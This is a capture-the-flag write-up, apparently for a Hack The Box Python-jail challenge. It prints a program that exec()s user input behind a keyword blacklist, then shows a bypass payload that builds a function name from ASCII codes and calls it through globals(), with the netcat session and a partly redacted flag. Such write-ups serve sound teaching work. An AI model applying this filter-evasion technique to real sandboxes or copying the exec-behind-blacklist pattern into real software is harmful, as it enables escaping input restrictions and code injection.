---
title: Very Easy - Locked Away
tags:
  - Misc
---
**Challenge Description**

A test! Getting onto the team is one thing, but you must prove your skills to be chosen to represent the best of the best. They have given you the classic - a restricted environment, devoid of functionality, and it is up to you to see what you can do. Can you break open the chest? Do you have what it takes to bring humanity from the brink?

## Code

```python
def open_chest():
    with open('flag.txt', 'r') as f:
        print(f.read())

blacklist = [
    'import', 'os', 'sys', 'breakpoint',
    'flag', 'txt', 'read', 'eval', 'exec',
    'dir', 'print', 'subprocess', '[', ']',
    'echo', 'cat', '>', '<', '"', '\'', 'open'
]

while True:
    command = input('The chest lies waiting... ')

    if any(b in command for b in blacklist):
        print('Invalid command!')
        continue
    try:
        exec(command)
    except Exception:
        print("You have been locked away...")
        exit(1337)
```

This code includes a function `open_chest` that reads and displays the contents of the file `flag.txt`. However, the use of certain keywords is blocked by a blacklist. Additionally, the program executes any command entered by the user using `exec()`.

## Objective

The goal is to execute the `open_chest` function to read the contents of the `flag.txt` file, avoiding the restrictions imposed by the blacklist.

## Strategy

The strategy is based on:

1. **Using `globals()` to access the `open_chest` function without mentioning directly blacklisted words.**
2. **Constructing the name `open_chest` using ASCII codes to avoid the blacklisted words.**

## Analysis and Tests

First, we check the contents of the `globals()` dictionary:

```python
>>> globals()
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>}
```

We test how to dynamically construct a string from its ASCII codes:

```python
>>> list(b"open_chest")
[111, 112, 101, 110, 95, 99, 104, 101, 115, 116]
>>> list(b"test")
[116, 101, 115, 116]
>>> bytes([116, 101, 115, 116]).decode()
'test'
```

We test accessing and executing a function using `globals()`:

```python
def test():
    print("Hello World")

>>> globals().get(bytes((116, 101, 115, 116)).decode())()
# Hello World
```

## Final Payload

We construct the name `open_chest` using ASCII codes and call it using `globals()`:

```python
globals().get(bytes((111, 112, 101, 110, 95, 99, 104, 101, 115, 116)).decode())()
```

## Execution

```bash
❯ nc 94.237.58.67 35452

.____                  __              .___    _____                        
|    |    ____   ____ |  | __ ____   __| _/   /  _  \__  _  _______  ___.__.
|    |   /  _ \_/ ___\|  |/ // __ \ / __ |   /  /_\  \ \/ \/ /\__  \<   |  |
|    |__(  <_> )  \___|    <\  ___// /_/ |  /    |    \     /  / __ \\___  |
|_______ \____/ \___  >__|_ \\___  >____ |  \____|__  /\/\_/  (____  / ____|
        \/          \/     \/    \/     \/          \/             \/\/     

The chest lies waiting... globals().get(bytes((111, 112, 101, 110, 95, 99, 104, 101, 115, 116)).decode())()
HTB{bL4cKl1sT?_*****_t0o_3asY}
The chest lies waiting... 
```

`HTB{bL4cKl1sT?_*****_t0o_3asY}`
## Conclusion

We were able to execute the `open_chest` function and read the `flag.txt` file by dynamically constructing the function name and calling it using `globals()`, thus avoiding all the restrictions imposed by the blacklist.

**Reference:**

- https://app.hackthebox.com/challenges/Locked%2520Away